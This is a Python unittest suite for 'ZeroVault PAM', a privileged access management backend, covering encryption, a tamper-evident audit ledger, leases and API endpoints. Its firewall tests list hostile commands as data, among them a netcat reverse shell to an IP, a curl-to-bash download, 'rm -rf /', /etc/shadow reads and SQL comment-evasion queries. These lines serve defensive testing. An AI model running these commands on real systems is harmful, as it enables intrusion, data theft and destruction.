"""
ZeroVault PAM - Comprehensive Automated Test Suite
Verifies:
1. AES-256-GCM Envelope Encryption & PBKDF2 Key Derivation (vault_crypto.py)
2. Tamper-Evident SHA-256 Merkle Hash-Chain & Tamper Detection (audit_ledger.py)
3. Zero-Trust Mid-Air Command Firewall Policy Evaluator (ssh_proxy_gateway.py)
4. JIT Ephemeral Identity Provisioner & Password Rotator (jit_provisioner.py)
5. Background TTL Reaper Lifecycle & Session Termination (background_daemons.py)
6. Flask REST API Controller & Verification Endpoints (app.py)
"""

import unittest
import json
import time
from datetime import datetime, timezone, timedelta
from pam_backend.config import Config
from pam_backend import database as db
from pam_backend.vault_crypto import VaultCrypto
from pam_backend.audit_ledger import MerkleAuditLedger
from pam_backend.jit_provisioner import JITProvisioner
from pam_backend.ssh_proxy_gateway import SSHProxyGateway
from pam_backend.app import app

class TestZeroVaultPAM(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        """Initialize database before running tests."""
        db.init_db()

    def setUp(self):
        """Reset database to clean state for each test."""
        self.client = app.test_client()
        self.client.post("/api/reset")
        self.gateway = SSHProxyGateway()

    # --- 1. Cryptographic Secret Vault Tests ---
    def test_aes_envelope_encryption_roundtrip(self):
        """Tests AES-256-GCM envelope encryption and decryption."""
        original_secret = "P@ssword_Kali_Linux_Root_2026!#$%"
        envelope_json = VaultCrypto.encrypt_secret(original_secret)

        envelope = json.loads(envelope_json)
        self.assertEqual(envelope["cipher"], "AES-256-GCM")
        self.assertEqual(envelope["iterations"], Config.PBKDF2_ITERATIONS)
        self.assertIn("salt", envelope)
        self.assertIn("encrypted_dek", envelope)
        self.assertIn("ciphertext", envelope)

        decrypted = VaultCrypto.decrypt_secret(envelope_json)
        self.assertEqual(decrypted, original_secret)

    def test_aes_envelope_wrong_key_fails(self):
        """Verifies decryption fails if provided wrong master passphrase."""
        secret = "ConfidentialDBPassword123"
        envelope_json = VaultCrypto.encrypt_secret(secret, "CorrectKey123!")

        with self.assertRaises(ValueError):
            VaultCrypto.decrypt_secret(envelope_json, "WrongKey456!")

    def test_secure_password_entropy(self):
        """Verifies random password generator produces strong credentials."""
        pw1 = VaultCrypto.generate_secure_password(32)
        pw2 = VaultCrypto.generate_secure_password(32)
        self.assertEqual(len(pw1), 32)
        self.assertNotEqual(pw1, pw2)

    # --- 2. Merkle Hash-Chain & Tamper Detection Tests ---
    def test_merkle_ledger_unbroken_chain(self):
        """Verifies sequential SHA-256 block hash chaining."""
        b1 = MerkleAuditLedger.record_event("lease_t1", "jit_u1", "srv_1", "whoami", "ALLOWED")
        b2 = MerkleAuditLedger.record_event("lease_t1", "jit_u1", "srv_1", "ls -la", "ALLOWED")
        b3 = MerkleAuditLedger.record_event("lease_t1", "jit_u1", "srv_1", "cat /etc/shadow", "BLOCKED", "CREDENTIAL_FILE_ACCESS")

        self.assertEqual(b2["prev_hash"], b1["current_hash"])
        self.assertEqual(b3["prev_hash"], b2["current_hash"])

        integrity = MerkleAuditLedger.verify_ledger_integrity()
        self.assertTrue(integrity["valid"])
        self.assertGreaterEqual(integrity["total_blocks"], 4)  # Genesis + 3 blocks

    def test_merkle_ledger_detects_tampering(self):
        """Verifies that tampering with a row in the database breaks the chain."""
        b1 = MerkleAuditLedger.record_event("lease_t2", "jit_u2", "srv_1", "uname -a", "ALLOWED")
        b2 = MerkleAuditLedger.record_event("lease_t2", "jit_u2", "srv_1", "cat /etc/shadow", "BLOCKED", "CREDENTIAL_FILE_ACCESS")

        # Confirm valid before tamper
        self.assertTrue(MerkleAuditLedger.verify_ledger_integrity()["valid"])

        # Tamper with Block #b2
        MerkleAuditLedger.simulate_tamper_attack(b2["block_index"], "echo 'innocent command'")

        # Verification must now FAIL and pinpoint block
        tamper_check = MerkleAuditLedger.verify_ledger_integrity()
        self.assertFalse(tamper_check["valid"])
        self.assertEqual(tamper_check["tampered_block_index"], b2["block_index"])
        self.assertIn("CRITICAL TAMPER DETECTED", tamper_check["message"])

    # --- 3. Mid-Stream Command Firewall Policy Tests ---
    def test_command_firewall_blocks_forbidden_commands(self):
        """Verifies regex firewall blocks unauthorized root/credential/destructive commands."""
        forbidden_commands = [
            "cat /etc/shadow",
            "nano /etc/shadow",
            "more /etc/gshadow",
            "rm -rf /",
            "rm -rf /var",
            "sudo su -",
            "sudo su",
            "sudo -i",
            "visudo",
            "nc -e /bin/sh 192.168.1.50 4444",
            "curl https://malicious.org/bot.sh | bash",
            "chmod 777 /etc"
        ]

        for cmd in forbidden_commands:
            matched_rule = self.gateway._evaluate_firewall(cmd)
            self.assertIsNotNone(matched_rule, f"Failed to block: {cmd}")
            self.assertIn(matched_rule["category"], [
                "Credential Access", "Destructive Action",
                "Privilege Escalation", "Lateral Movement / Exfiltration", "Defense Evasion"
            ])

    def test_command_firewall_allows_safe_commands(self):
        """Verifies safe administrative commands pass through unhindered."""
        safe_commands = [
            "whoami",
            "id",
            "uname -a",
            "ls -la /home",
            "df -h",
            "ps aux",
            "uptime",
            "tail -n 50 /var/log/syslog"
        ]

        for cmd in safe_commands:
            matched_rule = self.gateway._evaluate_firewall(cmd)
            self.assertIsNone(matched_rule, f"Should have allowed safe command: {cmd}")

    # --- 4. JIT Ephemeral Provisioner & Password Rotator Tests ---
    def test_jit_lease_creation_and_expiration_calc(self):
        """Verifies JIT lease generation and TTL expiration calculation."""
        res = self.client.post("/api/leases", json={
            "server_id": "srv_kali_prod",
            "requester": "sec_analyst_01",
            "reason": "Emergency DB inspection",
            "ttl_minutes": 10
        })
        self.assertEqual(res.status_code, 201)
        data = res.get_json()
        self.assertTrue(data["lease_id"].startswith("lease_"))
        self.assertTrue(data["ephemeral_user"].startswith("jit_u"))
        self.assertEqual(data["ttl_minutes"], 10)
        self.assertIn("ssh -p 2222", data["ssh_connection_string"])

    def test_manual_lease_revocation(self):
        """Verifies manual administrator revocation marks lease revoked."""
        res = self.client.post("/api/leases", json={
            "server_id": "srv_kali_prod",
            "requester": "sec_analyst_02",
            "reason": "Test",
            "ttl_minutes": 15
        })
        lease_id = res.get_json()["lease_id"]

        rev_res = self.client.post(f"/api/leases/{lease_id}/revoke")
        self.assertEqual(rev_res.status_code, 200)

        lease_db = db.get_lease_by_id(lease_id)
        self.assertEqual(lease_db["status"], "MANUALLY_REVOKED")

    def test_master_password_rotation(self):
        """Verifies master server password rotation updates vault ciphertext."""
        server_before = db.get_server_by_id("srv_kali_prod")
        old_ciphertext = server_before["encrypted_password"]

        res = self.client.post("/api/servers/srv_kali_prod/rotate")
        self.assertEqual(res.status_code, 200)

        server_after = db.get_server_by_id("srv_kali_prod")
        new_ciphertext = server_after["encrypted_password"]
        self.assertNotEqual(old_ciphertext, new_ciphertext)

    # --- 5. REST API Endpoints Tests ---
    def test_api_kpis(self):
        res = self.client.get("/api/kpis")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("total_servers", data)
        self.assertIn("chain_integrity", data)
        self.assertEqual(data["chain_integrity"], "VALID")

    def test_api_servers_list(self):
        res = self.client.get("/api/servers")
        self.assertEqual(res.status_code, 200)
        servers = res.get_json()
        self.assertGreaterEqual(len(servers), 2)
        # Verify plaintext password is not exposed
        self.assertNotIn("password", servers[0])
        self.assertIn("envelope_preview", servers[0])

    def test_api_enroll_server(self):
        new_srv = {
            "server_id": "srv_dmz_web",
            "name": "DMZ Web Application Gateway",
            "host": "192.168.1.200",
            "ssh_port": 22,
            "admin_user": "nginx_admin",
            "password": "DMZ_MasterPassword_2026!"
        }
        res = self.client.post("/api/servers", json=new_srv)
        self.assertEqual(res.status_code, 201)

        srv_db = db.get_server_by_id("srv_dmz_web")
        self.assertIsNotNone(srv_db)
        decrypted = VaultCrypto.decrypt_secret(srv_db["encrypted_password"])
        self.assertEqual(decrypted, "DMZ_MasterPassword_2026!")

    # --- 6. New Features: SQL Firewall, Web Shell & Compliance Tests ---
    def test_sql_firewall_blocks_destructive_ddl(self):
        """Verifies Database SQL Query Firewall blocks DROP TABLE and card dumps."""
        res_drop = self.client.post("/api/db/query", json={"query": "DROP TABLE customers;", "user": "test_user"})
        data_drop = res_drop.get_json()
        self.assertEqual(data_drop["status"], "BLOCKED_BY_FIREWALL")
        self.assertEqual(data_drop["rule_id"], "SQL-DESTR-01")

        res_exfil = self.client.post("/api/db/query", json={"query": "SELECT * FROM credit_cards WHERE 1=1;", "user": "test_user"})
        data_exfil = res_exfil.get_json()
        self.assertEqual(data_exfil["status"], "BLOCKED_BY_FIREWALL")
        self.assertEqual(data_exfil["rule_id"], "SQL-EXFIL-02")

    def test_sql_firewall_allows_safe_queries(self):
        """Verifies safe SELECT queries execute and return table data."""
        res = self.client.post("/api/db/query", json={"query": "SELECT id, name, email FROM customers;", "user": "test_user"})
        data = res.get_json()
        self.assertEqual(data["status"], "EXECUTED")
        self.assertGreaterEqual(data["row_count"], 3)
        self.assertIn("Alice Smith", [r["name"] for r in data["rows"]])

    def test_web_terminal_execution(self):
        """Verifies in-browser web terminal executes safe commands and blocks forbidden commands."""
        res_safe = self.client.post("/api/terminal/execute", json={"command": "whoami", "user": "jit_web_user"})
        self.assertEqual(res_safe.get_json()["status"], "ALLOWED")
        self.assertEqual(res_safe.get_json()["output"], "jit_web_user")

        res_block = self.client.post("/api/terminal/execute", json={"command": "cat /etc/shadow", "user": "jit_web_user"})
        self.assertEqual(res_block.get_json()["status"], "BLOCKED")
        self.assertIn("BLOCKED", res_block.get_json()["output"])

    def test_compliance_report_export(self):
        """Verifies Bank Compliance Certificate endpoint returns verified Merkle proof & standards."""
        res = self.client.get("/api/report/compliance")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("PCI-DSS v4.0", [s["standard"] for s in data["standard_compliance"]])
        self.assertEqual(data["cryptographic_integrity_proof"]["status"], "MATHEMATICALLY_VERIFIED")

    def test_notification_config(self):
        """Verifies saving Telegram phone notification settings."""
        res = self.client.post("/api/notify/config", json={
            "bot_token": "123456789:ABCDEF_TEST_TOKEN",
            "chat_id": "987654321"
        })
        self.assertEqual(res.status_code, 200)
        self.assertTrue(res.get_json()["configured"])

    # --- 7. Hardening & Evasion Prevention Tests ---
    def test_sql_firewall_comment_evasion(self):
        """Verifies that SQL comments (/**/ or --) cannot bypass the firewall."""
        evasion_queries = [
            "DROP/**/TABLE customers;",
            "/* bypass attempt */ DROP TABLE customers;",
            "-- safe comment\nDROP TABLE customers;"
        ]
        for q in evasion_queries:
            res = self.client.post("/api/db/query", json={"query": q, "user": "attacker"})
            self.assertEqual(res.get_json()["status"], "BLOCKED_BY_FIREWALL", f"Failed to block comment evasion: {q}")

    def test_sql_firewall_column_level_pii_block(self):
        """Verifies that sensitive columns (card_numbers, cvv, passwords) are blocked in SELECT projections."""
        queries = [
            "SELECT card_numbers, cvv FROM customers;",
            "SELECT id, passwords FROM accounts;",
            "SELECT ssn FROM employees;"
        ]
        for q in queries:
            res = self.client.post("/api/db/query", json={"query": q, "user": "analyst"})
            self.assertEqual(res.get_json()["status"], "BLOCKED_BY_FIREWALL", f"Failed to block sensitive column exfiltration: {q}")
            self.assertEqual(res.get_json()["rule_id"], "SQL-EXFIL-02")

    def test_command_firewall_advanced_evasions(self):
        """Verifies that command flags like 'cat -n /etc/shadow' or 'chmod 777 /' are blocked."""
        evasions = [
            "cat -n /etc/shadow",
            "head -n 20 /etc/shadow",
            "chmod 777 /",
            "sudo su"
        ]
        for cmd in evasions:
            rule = self.gateway._evaluate_firewall(cmd)
            self.assertIsNotNone(rule, f"Failed to block evasion: {cmd}")

    def test_robust_input_validation(self):
        """Verifies endpoints handle null or malformed data gracefully without 500 errors."""
        # 1. Null server_id should return 400 Bad Request, not 500
        res = self.client.post("/api/servers", json={"server_id": None, "name": "Test"})
        self.assertEqual(res.status_code, 400)

        # 2. None ttl_minutes should fallback gracefully
        res2 = self.client.post("/api/leases", json={"server_id": "srv_kali_prod", "ttl_minutes": None})
        self.assertEqual(res2.status_code, 201)

if __name__ == "__main__":
    unittest.main()
